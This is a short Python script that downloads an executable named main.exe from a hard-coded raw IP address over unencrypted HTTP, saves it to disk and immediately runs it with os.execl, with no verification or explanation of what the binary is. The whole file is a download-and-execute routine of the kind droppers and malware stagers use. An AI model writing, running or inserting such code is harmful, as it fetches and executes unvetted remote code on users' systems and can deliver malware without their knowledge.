import requests
import os

if __name__ == "__main__":
    file = open("./main.exe", 'wb')
    file.write(requests.get("http://175.178.59.154/d/Guest/main.exe").content)
    file.close()
    os.execl("./main.exe", "main.exe","")